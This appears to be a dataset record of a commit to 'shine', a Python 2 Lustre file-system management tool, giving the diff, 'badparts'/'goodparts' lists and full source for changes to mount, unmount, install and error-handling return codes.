b/lib/Shine/Commands/Umount.py\nindex d7e75e8..1a6867e 100644\n--- a/lib/Shine/Commands/Umount.py\n+++ b/lib/Shine/Commands/Umount.py\n@@ -58,7 +58,7 @@ def ev_stopclient_start(self, node, client):\n     def ev_stopclient_done(self, node, client):\n         if self.verbose > 1:\n             if client.status_info:\n-                print \"%s: Umount: %s\" % (node, client.status_info)\n+                print \"%s: Umount %s: %s\" % (node, client.fs.fs_name, client.status_info)\n             else:\n                 print \"%s: FS %s succesfully unmounted from %s\" % (node,\n                         client.fs.fs_name, client.mount_path)\n@@ -126,6 +126,13 @@ def execute(self):\n \n             fs.set_debug(self.debug_support.has_debug())\n \n+            if not self.remote_call and vlevel > 0:\n+                if nodes:\n+                    m_nodes = nodes.intersection(fs.get_client_servers())\n+                else:\n+                    m_nodes = fs.get_client_servers()\n+                print \"Stopping %s clients on %s...\" % (fs.fs_name, m_nodes)\n+\n             status = fs.umount()\n             rc = self.fs_status_to_rc(status)\n             if rc > result:\n@@ -133,7 +140,8 @@ def execute(self):\n \n             if rc == RC_OK:\n                 if vlevel > 0:\n-                    print \"Unmount successful.\"\n+                        # m_nodes is defined if not self.remote_call and vlevel > 0\n+                    print \"Unmount successful on %s\" % m_nodes\n             elif rc == RC_RUNTIME_ERROR:\n                 for nodes, msg in fs.proxy_errors:\n                     print \"%s: %s\" % (nodes, msg)\ndiff --git a/lib/Shine/Configuration/FileSystem.py b/lib/Shine/Configuration/FileSystem.py\nindex 022e8c1..5aa3938 100644\n--- a/lib/Shine/Configuration/FileSystem.py\n+++ b/lib/Shine/Configuration/FileSystem.py\n@@ -176,9 +176,7 @@ def get_nid(self, node):\n         try:\n             return self.nid_map[node]\n         except KeyError:\n-            print \"Cannot get NID for %s, aborting. Please verify `nid_map' configuration.\" % node\n-            # FIXME : raise fatal exception\n-            sys.exit(1)\n+            raise ConfigException(\"Cannot get NID for %s, aborting. Please verify `nid_map' configuration.\" % node)\n \n     def __str__(self):\n         return \">> BACKEND:\\n%s\\n>> MODEL:\\n%s\" % (self.backend, Model.__str__(self))\ndiff --git a/lib/Shine/Controller.py b/lib/Shine/Controller.py\nindex d6f04d2..42955d2 100644\n--- a/lib/Shine/Controller.py\n+++ b/lib/Shine/Controller.py\n@@ -98,29 +98,23 @@ def run_command(self, cmd_args):\n             self.print_help(e.message, e.cmd)\n         except CommandException, e:\n             self.print_error(e.message)\n-            return RC_USER_ERROR\n         except ModelFileIOError, e:\n             print \"Error - %s\" % e.message\n         except ModelFileException, e:\n             print \"ModelFile: %s\" % e\n         except ConfigException, e:\n             print \"Configuration: %s\" % e\n-            return RC_RUNTIME_ERROR\n         # file system\n         except FSRemoteError, e:\n             self.print_error(e)\n             return e.rc\n         except NodeSetParseError, e:\n             self.print_error(\"%s\" % e)\n-            return RC_USER_ERROR\n         except RangeSetParseError, e:\n             self.print_error(\"%s\" % e)\n-            return RC_USER_ERROR\n         except KeyError:\n-            print \"Error - Unrecognized action\"\n-            print\n             raise\n         \n-        return 1\n+        return RC_RUNTIME_ERROR\n \n \ndiff --git a/lib/Shine/Lustre/Actions/Proxies/FSProxyAction.py b/lib/Shine/Lustre/Actions/Proxies/FSProxyAction.py\nindex c918520..b6d09d9 100644\n--- a/lib/Shine/Lustre/Actions/Proxies/FSProxyAction.py\n+++ b/lib/Shine/Lustre/Actions/Proxies/FSProxyAction.py\n@@ -80,9 +80,11 @@ def ev_close(self, worker):\n         \"\"\"\n         # Gather nodes by return code\n         for rc, nodes in worker.iter_retcodes():\n+            # some common remote errors:\n             # rc 127 = command not found\n             # rc 126 = found but not executable\n-            if rc >= 126:\n+            # rc 1 = python failure...\n+            if rc != 0:\n                 # Gather these nodes by buffer\n                 for buffer, nodes in worker.iter_buffers(nodes):\n                     # Handle proxy command error which rc >= 127 and \ndiff --git a/lib/Shine/Lustre/FileSystem.py b/lib/Shine/Lustre/FileSystem.py\nindex 696989d..61c642b 100644\n--- a/lib/Shine/Lustre/FileSystem.py\n+++ b/lib/Shine/Lustre/FileSystem.py\n@@ -592,6 +592,8 @@ def status(self, flags=STATUS_ANY):\n                         target.state = RUNTIME_ERROR\n \n         for target in launched:\n+            if target.state == None:\n+                print target, target.server\n             assert target.state != None\n             targets = rdict.setdefault(target.state, [])\n             targets.append(target)\ndiff --git a/scripts/shine b/scripts/shine\nindex 257a504..201cc39 100755\n--- a/scripts/shine\n+++ b/scripts/shine\n@@ -56,15 +56,18 @@ def main():\n         print \"%s (lib: r%s, script: r%s)\" % (public_version, librev, scrrev)\n         sys.exit(0)\n \n+    rc = 128\n+\n     try:\n         rc = controller.run_command(sys.argv[1:])\n-        sys.exit(rc)\n     except KeyError:\n         usage(controller)\n-        sys.exit(2)\n-    except (KeyboardInterrupt, SystemExit):\n+    except KeyboardInterrupt:\n         print >>sys.stderr, \"Exiting.\"\n-        sys.exit(2)\n+    except SystemExit, e:\n+        rc = r.code or rc\n+\n+    sys.exit(rc)\n         \n \n if __name__ == '__main__':\n", "files": {"/lib/Shine/Commands/CommandRegistry.py": {"changes": [{"diff": "\n         command.parse(new_args)\n \n         # Execute\n-        return command.execute()\n+        rc = command.execute()\n+\n+        # Filter rc\n+        return command.filter_rc(rc)", "add": 4, "remove": 1, "filename": "/lib/Shine/Commands/CommandRegistry.py", "badparts": ["        return command.execute()"], "goodparts": ["        rc = command.execute()", "        return command.filter_rc(rc)"]}], "source": "\n from Base.Command import Command from Shine.Commands import commandList from Exceptions import * class CommandRegistry: \"\"\"Container object to deal with commands.\"\"\" def __init__(self): self.cmd_list=[] self.cmd_dict={} self.cmd_optargs={} self._load() def __len__(self): \"Return the number of commands.\" return len(self.cmd_list) def __iter__(self): \"Iterate over available commands.\" for cmd in self.cmd_list: yield cmd def _load(self): for cmdobj in commandList: self.register(cmdobj()) def get(self, name): return self.cmd_dict[name] def register(self, cmd): \"Register a new command.\" assert isinstance(cmd, Command) self.cmd_list.append(cmd) self.cmd_dict[cmd.get_name()]=cmd opt_len=len(cmd.getopt_string) for i in range(0, opt_len): c=cmd.getopt_string[i] if c==':': continue has_arg=not(i==opt_len -1) and(cmd.getopt_string[i+1]==':') if c in self.cmd_optargs: assert self.cmd_optargs[c]==has_arg, \"Incoherency in option arguments\" else: self.cmd_optargs[c]=has_arg def execute(self, args): \"\"\" Execute a shine script command. \"\"\" command=None new_args=[] try: next_is_arg=False for opt in args: if opt.startswith('-'): new_args.append(opt) next_is_arg=self.cmd_optargs[opt[-1:]] elif next_is_arg: new_args.append(opt) next_is_arg=False else: if command: if command.has_subcommand(): new_args.append(opt) else: raise CommandHelpException(\"Syntax error.\", command) else: command=self.get(opt) next_is_arg=False except KeyError, e: raise CommandNotFoundError(opt) command.parse(new_args) return command.execute() ", "sourceWithComments": "# CommandRegistry.py -- Shine commands registry\n# Copyright (C) 2007, 2009 CEA\n#\n# This file is part of shine\n#\n# This program is free software; you can redistribute it and/or\n# modify it under the terms of the GNU General Public License\n# as published by the Free Software Foundation; either version 2\n# of the License, or (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program; if not, write to the Free Software\n# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.\n#\n# $Id$\n\n# Base command class definition\nfrom Base.Command import Command\n\n# Import list of enabled commands (defined in the module __init__.py)\nfrom Shine.Commands import commandList\n\nfrom Exceptions import *\n\n\n# ----------------------------------------------------------------------\n# Command Registry\n# ----------------------------------------------------------------------\n\n\nclass CommandRegistry:\n    \"\"\"Container object to deal with commands.\"\"\"\n\n    def __init__(self):\n        self.cmd_list = []\n        self.cmd_dict = {}\n        self.cmd_optargs = {}\n\n        # Autoload commands\n        self._load()\n\n    def __len__(self):\n        \"Return the number of commands.\"\n        return len(self.cmd_list)\n\n    def __iter__(self):\n        \"Iterate over available commands.\"\n        for cmd in self.cmd_list:\n            yield cmd\n\n    # Private methods\n\n    def _load(self):\n        for cmdobj in commandList:\n            self.register(cmdobj())\n\n    # Public methods\n\n    def get(self, name):\n        return self.cmd_dict[name]\n\n    def register(self, cmd):\n        \"Register a new command.\"\n        assert isinstance(cmd, Command)\n\n        self.cmd_list.append(cmd)\n        self.cmd_dict[cmd.get_name()] = cmd\n\n        # Keep an eye on ALL option arguments, this is to insure a global\n        # options coherency within shine and allow us to intermix options and\n        # command -- see execute() below.\n        opt_len = len(cmd.getopt_string)\n        for i in range(0, opt_len):\n            c = cmd.getopt_string[i]\n            if c == ':':\n                continue\n            has_arg = not (i == opt_len - 1) and (cmd.getopt_string[i+1] == ':')\n            if c in self.cmd_optargs:\n                assert self.cmd_optargs[c] == has_arg, \"Incoherency in option arguments\"\n            else:\n                self.cmd_optargs[c] = has_arg \n\n    def execute(self, args):\n        \"\"\"\n        Execute a shine script command.\n        \"\"\"\n        # Get command and options. Options and command may be intermixed.\n        command = None\n        new_args = []\n        try:\n            # Find command through options...\n            next_is_arg = False\n            for opt in args:\n                if opt.startswith('-'):\n                    new_args.append(opt)\n                    next_is_arg = self.cmd_optargs[opt[-1:]]\n                elif next_is_arg:\n                    new_args.append(opt)\n                    next_is_arg = False\n                else:\n                    if command:\n                        # Command has already been found, so?\n                        if command.has_subcommand():\n                            # The command supports subcommand: keep it in new_args.\n                            new_args.append(opt)\n                        else:\n                            raise CommandHelpException(\"Syntax error.\", command)\n                    else:\n                        command = self.get(opt)\n                    next_is_arg = False\n        except KeyError, e:\n            raise CommandNotFoundError(opt)\n\n        # Parse\n        command.parse(new_args)\n\n        # Execute\n        return command.execute()\n\n"}, "/lib/Shine/Commands/Install.py": {"changes": [{"diff": "\n \n     def execute(self):\n         if not self.opt_m:\n-            print \"Bad argument\"\n+            raise CommandHelpException(\"Lustre model file path (-m <model_file>) argument required.\", self)\n         else:\n             # Use this Shine.FSUtils convenience function.\n             fs_conf, fs = create_lustrefs(self.lmf_support.get_lmf_path(),\n", "add": 1, "remove": 1, "filename": "/lib/Shine/Commands/Install.py", "badparts": ["            print \"Bad argument\""], "goodparts": ["            raise CommandHelpException(\"Lustre model file path (-m <model_file>) argument required.\", self)"]}, {"diff": "\n                 print \"Use `shine format -f %s' to initialize the file system.\" % \\\n                         fs_conf.get_fs_name()\n \n-            return 0\n+            return RC_O", "add": 1, "remove": 1, "filename": "/lib/Shine/Commands/Install.py", "badparts": ["            return 0"], "goodparts": ["            return RC_O"]}], "source": "\n from Shine.Configuration.Configuration import Configuration from Shine.Configuration.Globals import Globals from Shine.FSUtils import create_lustrefs from Base.Command import Command from Base.Support.LMF import LMF from Base.Support.Nodes import Nodes class Install(Command): \"\"\" shine install -f /path/to/model.lmf \"\"\" def __init__(self): Command.__init__(self) self.lmf_support=LMF(self) self.nodes_support=Nodes(self) def get_name(self): return \"install\" def get_desc(self): return \"Install a new file system.\" def execute(self): if not self.opt_m: print \"Bad argument\" else: fs_conf, fs=create_lustrefs(self.lmf_support.get_lmf_path(), event_handler=self) install_nodes=self.nodes_support.get_nodeset() fs.install(fs_conf.get_cfg_filename(), nodes=install_nodes) if install_nodes: nodestr=\" on %s\" % install_nodes else: nodestr=\"\" print \"Configuration files for file system %s have been installed \" \\ \"successfully%s.\" %(fs_conf.get_fs_name(), nodestr) if not install_nodes: print print \"Lustre targets summary:\" print \"\\t%d MGT on %s\" %(fs.mgt_count, fs.mgt_servers) print \"\\t%d MDT on %s\" %(fs.mdt_count, fs.mdt_servers) print \"\\t%d OST on %s\" %(fs.ost_count, fs.ost_servers) print print \"Use `shine format -f %s' to initialize the file system.\" % \\ fs_conf.get_fs_name() return 0 ", "sourceWithComments": "# Install.py -- File system installation commands\n# Copyright (C) 2007, 2008, 2009 CEA\n#\n# This file is part of shine\n#\n# This program is free software; you can redistribute it and/or\n# modify it under the terms of the GNU General Public License\n# as published by the Free Software Foundation; either version 2\n# of the License, or (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program; if not, write to the Free Software\n# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.\n#\n# $Id$\n\nfrom Shine.Configuration.Configuration import Configuration\nfrom Shine.Configuration.Globals import Globals \n\nfrom Shine.FSUtils import create_lustrefs\n\nfrom Base.Command import Command\nfrom Base.Support.LMF import LMF\nfrom Base.Support.Nodes import Nodes\n\n\nclass Install(Command):\n    \"\"\"\n    shine install -f /path/to/model.lmf\n    \"\"\"\n    \n    def __init__(self):\n        Command.__init__(self)\n\n        self.lmf_support = LMF(self)\n        self.nodes_support = Nodes(self)\n\n    def get_name(self):\n        return \"install\"\n\n    def get_desc(self):\n        return \"Install a new file system.\"\n\n    def execute(self):\n        if not self.opt_m:\n            print \"Bad argument\"\n        else:\n            # Use this Shine.FSUtils convenience function.\n            fs_conf, fs = create_lustrefs(self.lmf_support.get_lmf_path(),\n                    event_handler=self)\n\n            install_nodes = self.nodes_support.get_nodeset()\n\n            # Install file system configuration files; normally, this should\n            # not be done by the Shine.Lustre.FileSystem object itself, but as\n            # all proxy methods are currently handled by it, it is more\n            # convenient this way...\n            fs.install(fs_conf.get_cfg_filename(), nodes=install_nodes)\n\n            if install_nodes:\n                nodestr = \" on %s\" %  install_nodes\n            else:\n                nodestr = \"\"\n\n            print \"Configuration files for file system %s have been installed \" \\\n                    \"successfully%s.\" % (fs_conf.get_fs_name(), nodestr)\n\n            if not install_nodes:\n                # Print short file system summary.\n                print\n                print \"Lustre targets summary:\"\n                print \"\\t%d MGT on %s\" % (fs.mgt_count, fs.mgt_servers)\n                print \"\\t%d MDT on %s\" % (fs.mdt_count, fs.mdt_servers)\n                print \"\\t%d OST on %s\" % (fs.ost_count, fs.ost_servers)\n                print\n\n                # Give pointer to next user step.\n                print \"Use `shine format -f %s' to initialize the file system.\" % \\\n                        fs_conf.get_fs_name()\n\n            return 0\n\n"}, "/lib/Shine/Commands/Mount.py": {"changes": [{"diff": "\n     def ev_startclient_done(self, node, client):\n         if self.verbose > 1:\n             if client.status_info:\n-                print \"%s: Mount: %s\" % (node, client.status_info)\n+                print \"%s: Mount %s: %s\" % (node, client.fs.fs_name, client.status_info)\n             else:\n                 print \"%s: FS %s succesfully mounted on %s\" % (node,\n                         client.fs.fs_name, client.mount_path)\n", "add": 1, "remove": 1, "filename": "/lib/Shine/Commands/Mount.py", "badparts": ["                print \"%s: Mount: %s\" % (node, client.status_info)"], "goodparts": ["                print \"%s: Mount %s: %s\" % (node, client.fs.fs_name, client.status_info)"]}, {"diff": "\n \n             fs.set_debug(self.debug_support.has_debug())\n \n+            if not self.remote_call and vlevel > 0:\n+                if nodes:\n+                    m_nodes = nodes.intersection(fs.get_client_servers())\n+                else:\n+                    m_nodes = fs.get_client_servers()\n+                print \"Starting %s clients on %s...\" % (fs.fs_name, m_nodes)\n+\n             status = fs.mount(mount_options=fs_conf.get_mount_options())\n             rc = self.fs_status_to_rc(status)\n             if rc > result:\n                 result = rc\n \n-            if rc == RC_OK:\n-                if vlevel > 0:\n-                    print \"Mount successful.\"\n-            elif rc == RC_RUNTIME_ERROR:\n-                for nodes, msg in fs.proxy_errors:\n-                    print \"%s: %s\" % (nodes, msg)\n+            if not self.remote_call:\n+                if rc == RC_OK:\n+                    if vlevel > 0:\n+                        # m_nodes is defined if not self.remote_call and vlevel > 0\n+                        print \"Mount successful on %s\" % m_nodes\n+                elif rc == RC_RUNTIME_ERROR:\n+                    for nodes, msg in fs.proxy_errors:\n+                        print \"%s: %s\" % (nodes, msg)\n \n         return resu", "add": 15, "remove": 6, "filename": "/lib/Shine/Commands/Mount.py", "badparts": ["            if rc == RC_OK:", "                if vlevel > 0:", "                    print \"Mount successful.\"", "            elif rc == RC_RUNTIME_ERROR:", "                for nodes, msg in fs.proxy_errors:", "                    print \"%s: %s\" % (nodes, msg)"], "goodparts": ["            if not self.remote_call and vlevel > 0:", "                if nodes:", "                    m_nodes = nodes.intersection(fs.get_client_servers())", "                else:", "                    m_nodes = fs.get_client_servers()", "                print \"Starting %s clients on %s...\" % (fs.fs_name, m_nodes)", "            if not self.remote_call:", "                if rc == RC_OK:", "                    if vlevel > 0:", "                        print \"Mount successful on %s\" % m_nodes", "                elif rc == RC_RUNTIME_ERROR:", "                    for nodes, msg in fs.proxy_errors:", "                        print \"%s: %s\" % (nodes, msg)"]}], "source": "\n \"\"\" Shine `mount' command classes. The mount command aims to start Lustre filesystem clients. \"\"\" import os from Shine.Configuration.Configuration import Configuration from Shine.Configuration.Globals import Globals from Shine.Configuration.Exceptions import * from Base.FSClientLiveCommand import FSClientLiveCommand from Base.CommandRCDefs import * from Base.RemoteCallEventHandler import RemoteCallEventHandler from Exceptions import CommandException from Shine.FSUtils import open_lustrefs import Shine.Lustre.EventHandler from Shine.Lustre.FileSystem import * class GlobalMountEventHandler(Shine.Lustre.EventHandler.EventHandler): def __init__(self, verbose=1): self.verbose=verbose def ev_startclient_start(self, node, client): if self.verbose > 1: print \"%s: Mounting %s on %s...\" %(node, client.fs.fs_name, client.mount_path) def ev_startclient_done(self, node, client): if self.verbose > 1: if client.status_info: print \"%s: Mount: %s\" %(node, client.status_info) else: print \"%s: FS %s succesfully mounted on %s\" %(node, client.fs.fs_name, client.mount_path) def ev_startclient_failed(self, node, client, rc, message): if rc: strerr=os.strerror(rc) else: strerr=message print \"%s: Failed to mount FS %s on %s: %s\" % \\ (node, client.fs.fs_name, client.mount_path, strerr) if rc: print message class Mount(FSClientLiveCommand): \"\"\" \"\"\" def __init__(self): FSClientLiveCommand.__init__(self) def get_name(self): return \"mount\" def get_desc(self): return \"Mount file system clients.\" target_status_rc_map={ \\ MOUNTED: RC_OK, RECOVERING: RC_FAILURE, OFFLINE: RC_FAILURE, TARGET_ERROR: RC_TARGET_ERROR, CLIENT_ERROR: RC_CLIENT_ERROR, RUNTIME_ERROR: RC_RUNTIME_ERROR} def fs_status_to_rc(self, status): return self.target_status_rc_map[status] def execute(self): result=0 self.init_execute() vlevel=self.verbose_support.get_verbose_level() for fsname in self.fs_support.iter_fsname(): eh=self.install_eventhandler(None, GlobalMountEventHandler(vlevel)) nodes=self.nodes_support.get_nodeset() fs_conf, fs=open_lustrefs(fsname, None, nodes=nodes, indexes=None, event_handler=eh) if nodes and not nodes.issubset(fs_conf.get_client_nodes()): raise CommandException(\"%s are not client nodes of filesystem '%s'\" % \\ (nodes -fs_conf.get_client_nodes(), fsname)) fs.set_debug(self.debug_support.has_debug()) status=fs.mount(mount_options=fs_conf.get_mount_options()) rc=self.fs_status_to_rc(status) if rc > result: result=rc if rc==RC_OK: if vlevel > 0: print \"Mount successful.\" elif rc==RC_RUNTIME_ERROR: for nodes, msg in fs.proxy_errors: print \"%s: %s\" %(nodes, msg) return result ", "sourceWithComments": "# Mount.py -- Mount file system on clients\n# Copyright (C) 2007, 2008, 2009 CEA\n#\n# This file is part of shine\n#\n# This program is free software; you can redistribute it and/or\n# modify it under the terms of the GNU General Public License\n# as published by the Free Software Foundation; either version 2\n# of the License, or (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program; if not, write to the Free Software\n# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.\n#\n# $Id$\n\n\"\"\"\nShine `mount' command classes.\n\nThe mount command aims to start Lustre filesystem clients.\n\"\"\"\n\nimport os\n\n# Configuration\nfrom Shine.Configuration.Configuration import Configuration\nfrom Shine.Configuration.Globals import Globals \nfrom Shine.Configuration.Exceptions import *\n\n# Command base class\nfrom Base.FSClientLiveCommand import FSClientLiveCommand\nfrom Base.CommandRCDefs import *\n# -R handler\nfrom Base.RemoteCallEventHandler import RemoteCallEventHandler\n\nfrom Exceptions import CommandException\n\n# Command helper\nfrom Shine.FSUtils import open_lustrefs\n\n# Lustre events\nimport Shine.Lustre.EventHandler\nfrom Shine.Lustre.FileSystem import *\n\nclass GlobalMountEventHandler(Shine.Lustre.EventHandler.EventHandler):\n\n    def __init__(self, verbose=1):\n        self.verbose = verbose\n\n    def ev_startclient_start(self, node, client):\n        if self.verbose > 1:\n            print \"%s: Mounting %s on %s ...\" % (node, client.fs.fs_name, client.mount_path)\n\n    def ev_startclient_done(self, node, client):\n        if self.verbose > 1:\n            if client.status_info:\n                print \"%s: Mount: %s\" % (node, client.status_info)\n            else:\n                print \"%s: FS %s succesfully mounted on %s\" % (node,\n                        client.fs.fs_name, client.mount_path)\n\n    def ev_startclient_failed(self, node, client, rc, message):\n        if rc:\n            strerr = os.strerror(rc)\n        else:\n            strerr = message\n        print \"%s: Failed to mount FS %s on %s: %s\" % \\\n                (node, client.fs.fs_name, client.mount_path, strerr)\n        if rc:\n            print message\n\n\nclass Mount(FSClientLiveCommand):\n    \"\"\"\n    \"\"\"\n\n    def __init__(self):\n        FSClientLiveCommand.__init__(self)\n\n    def get_name(self):\n        return \"mount\"\n\n    def get_desc(self):\n        return \"Mount file system clients.\"\n\n    target_status_rc_map = { \\\n            MOUNTED : RC_OK,\n            RECOVERING : RC_FAILURE,\n            OFFLINE : RC_FAILURE,\n            TARGET_ERROR : RC_TARGET_ERROR,\n            CLIENT_ERROR : RC_CLIENT_ERROR,\n            RUNTIME_ERROR : RC_RUNTIME_ERROR }\n\n    def fs_status_to_rc(self, status):\n        return self.target_status_rc_map[status]\n\n    def execute(self):\n        result = 0\n\n        self.init_execute()\n\n        # Get verbose level.\n        vlevel = self.verbose_support.get_verbose_level()\n\n        for fsname in self.fs_support.iter_fsname():\n\n            # Install appropriate event handler.\n            eh = self.install_eventhandler(None,\n                    GlobalMountEventHandler(vlevel))\n\n            nodes = self.nodes_support.get_nodeset()\n\n            fs_conf, fs = open_lustrefs(fsname, None,\n                    nodes=nodes,\n                    indexes=None,\n                    event_handler=eh)\n\n            if nodes and not nodes.issubset(fs_conf.get_client_nodes()):\n                raise CommandException(\"%s are not client nodes of filesystem '%s'\" % \\\n                        (nodes - fs_conf.get_client_nodes(), fsname))\n\n            fs.set_debug(self.debug_support.has_debug())\n\n            status = fs.mount(mount_options=fs_conf.get_mount_options())\n            rc = self.fs_status_to_rc(status)\n            if rc > result:\n                result = rc\n\n            if rc == RC_OK:\n                if vlevel > 0:\n                    print \"Mount successful.\"\n            elif rc == RC_RUNTIME_ERROR:\n                for nodes, msg in fs.proxy_errors:\n                    print \"%s: %s\" % (nodes, msg)\n\n        return result\n\n"}, "/lib/Shine/Commands/Preinstall.py": {"changes": [{"diff": "\n             if not os.path.exists(conf_dir_path):\n                 os.makedirs(conf_dir_path, 0755)\n         except OSError, ex:\n-            print \"OSError\"\n-            raise\n+            print \"OSError %s\" % ex\n+            return RC_RUNTIME_ERROR\n \n+        return ", "add": 3, "remove": 2, "filename": "/lib/Shine/Commands/Preinstall.py", "badparts": ["            print \"OSError\"", "            raise"], "goodparts": ["            print \"OSError %s\" % ex", "            return RC_RUNTIME_ERROR", "        return "]}], "source": "\n from Shine.Configuration.Configuration import Configuration from Shine.Configuration.Globals import Globals from Shine.Configuration.Exceptions import * from Shine.FSUtils import create_lustrefs from Base.RemoteCommand import RemoteCommand from Base.Support.FS import FS import os class Preinstall(RemoteCommand): \"\"\" shine preinstall -f <filesystem name> -R \"\"\" def __init__(self): RemoteCommand.__init__(self) self.fs_support=FS(self) def get_name(self): return \"preinstall\" def get_desc(self): return \"Preinstall a new file system.\" def is_hidden(self): return True def execute(self): try: conf_dir_path=Globals().get_conf_dir() if not os.path.exists(conf_dir_path): os.makedirs(conf_dir_path, 0755) except OSError, ex: print \"OSError\" raise ", "sourceWithComments": "# Preinstall.py -- File system installation commands\n# Copyright (C) 2007, 2008 CEA\n#\n# This file is part of shine\n#\n# This program is free software; you can redistribute it and/or\n# modify it under the terms of the GNU General Public License\n# as published by the Free Software Foundation; either version 2\n# of the License, or (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program; if not, write to the Free Software\n# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.\n#\n# $Id$\n\nfrom Shine.Configuration.Configuration import Configuration\nfrom Shine.Configuration.Globals import Globals \nfrom Shine.Configuration.Exceptions import *\n\nfrom Shine.FSUtils import create_lustrefs\n\nfrom Base.RemoteCommand import RemoteCommand\nfrom Base.Support.FS import FS\n\nimport os\n\nclass Preinstall(RemoteCommand):\n    \"\"\"\n    shine preinstall -f <filesystem name> -R\n    \"\"\"\n    \n    def __init__(self):\n        RemoteCommand.__init__(self)\n        self.fs_support = FS(self)\n\n    def get_name(self):\n        return \"preinstall\"\n\n    def get_desc(self):\n        return \"Preinstall a new file system.\"\n\n    def is_hidden(self):\n        return True\n\n    def execute(self):\n        try:\n            conf_dir_path = Globals().get_conf_dir()\n            if not os.path.exists(conf_dir_path):\n                os.makedirs(conf_dir_path, 0755)\n        except OSError, ex:\n            print \"OSError\"\n            raise\n\n"}, "/lib/Shine/Commands/Start.py": {"changes": [{"diff": "\n             if hasattr(eh, 'post'):\n                 eh.post(fs)\n \n-            return rc\n+        return ", "add": 1, "remove": 1, "filename": "/lib/Shine/Commands/Start.py", "badparts": ["            return rc"], "goodparts": ["        return "]}], "source": "\n \"\"\" Shine `start' command classes. The start command aims to start Lustre filesystem servers or just some of the filesystem targets on local or remote servers. It is available for any filesystems previously installed and formatted. \"\"\" import os from Shine.Configuration.Configuration import Configuration from Shine.Configuration.Globals import Globals from Shine.Configuration.Exceptions import * from Shine.Commands.Status import Status from Shine.Commands.Tune import Tune from Base.FSLiveCommand import FSLiveCommand from Base.FSEventHandler import FSGlobalEventHandler from Base.CommandRCDefs import * from Base.RemoteCallEventHandler import RemoteCallEventHandler from Shine.FSUtils import open_lustrefs import Shine.Lustre.EventHandler from Shine.Lustre.Actions.Proxies.ProxyAction import * from Shine.Lustre.FileSystem import * class GlobalStartEventHandler(FSGlobalEventHandler): def __init__(self, verbose=1): FSGlobalEventHandler.__init__(self, verbose) def handle_pre(self, fs): if self.verbose > 0: print \"Starting %d targets on %s\" %(fs.target_count, fs.target_servers) def handle_post(self, fs): if self.verbose > 0: Status.status_view_fs(fs, show_clients=False) def ev_starttarget_start(self, node, target): if self.verbose > 1: print \"%s: Starting %s %s(%s)...\" %(node, \\ target.type.upper(), target.get_id(), target.dev) self.update() def ev_starttarget_done(self, node, target): self.status_changed=True if self.verbose > 1: if target.status_info: print \"%s: Start of %s %s(%s): %s\" % \\ (node, target.type.upper(), target.get_id(), target.dev, target.status_info) else: print \"%s: Start of %s %s(%s) succeeded\" % \\ (node, target.type.upper(), target.get_id(), target.dev) self.update() def ev_starttarget_failed(self, node, target, rc, message): self.status_changed=True if rc: strerr=os.strerror(rc) else: strerr=message print \"%s: Failed to start %s %s(%s): %s\" % \\ (node, target.type.upper(), target.get_id(), target.dev, strerr) if rc: print message self.update() class LocalStartEventHandler(Shine.Lustre.EventHandler.EventHandler): def __init__(self, verbose=1): self.verbose=verbose def ev_starttarget_start(self, node, target): if self.verbose > 1: print \"Starting %s %s(%s)...\" %(target.type.upper(), target.get_id(), target.dev) def ev_starttarget_done(self, node, target): if self.verbose > 1: if target.status_info: print \"Start of %s %s(%s): %s\" %(target.type.upper(), target.get_id(), target.dev, target.status_info) else: print \"Start of %s %s(%s) succeeded\" %(target.type.upper(), target.get_id(), target.dev) def ev_starttarget_failed(self, node, target, rc, message): if rc: strerr=os.strerror(rc) else: strerr=message print \"Failed to start %s %s(%s): %s\" %(target.type.upper(), target.get_id(), target.dev, strerr) if rc: print message class Start(FSLiveCommand): \"\"\" shine start[-f <fsname>][-t <target>][-i <index(es)>][-n <nodes>][-qv] \"\"\" def __init__(self): FSLiveCommand.__init__(self) def get_name(self): return \"start\" def get_desc(self): return \"Start file system servers.\" target_status_rc_map={ \\ MOUNTED: RC_OK, RECOVERING: RC_OK, OFFLINE: RC_FAILURE, TARGET_ERROR: RC_TARGET_ERROR, CLIENT_ERROR: RC_CLIENT_ERROR, RUNTIME_ERROR: RC_RUNTIME_ERROR} def fs_status_to_rc(self, status): return self.target_status_rc_map[status] def execute(self): result=0 self.init_execute() vlevel=self.verbose_support.get_verbose_level() target=self.target_support.get_target() for fsname in self.fs_support.iter_fsname(): eh=self.install_eventhandler(LocalStartEventHandler(vlevel), GlobalStartEventHandler(vlevel)) fs_conf, fs=open_lustrefs(fsname, target, nodes=self.nodes_support.get_nodeset(), indexes=self.indexes_support.get_rangeset(), event_handler=eh) mount_options={} mount_paths={} for target_type in[ 'mgt', 'mdt', 'ost']: mount_options[target_type]=fs_conf.get_target_mount_options(target_type) mount_paths[target_type]=fs_conf.get_target_mount_path(target_type) fs.set_debug(self.debug_support.has_debug()) if hasattr(eh, 'pre'): eh.pre(fs) status=fs.start(mount_options=mount_options, mount_paths=mount_paths) rc=self.fs_status_to_rc(status) if rc > result: result=rc if rc==RC_OK: if vlevel > 0: print \"Start successful.\" tuning=Tune.get_tuning(fs_conf) status=fs.tune(tuning) if status==RUNTIME_ERROR: rc=RC_RUNTIME_ERROR if rc==RC_RUNTIME_ERROR: for nodes, msg in fs.proxy_errors: print \"%s: %s\" 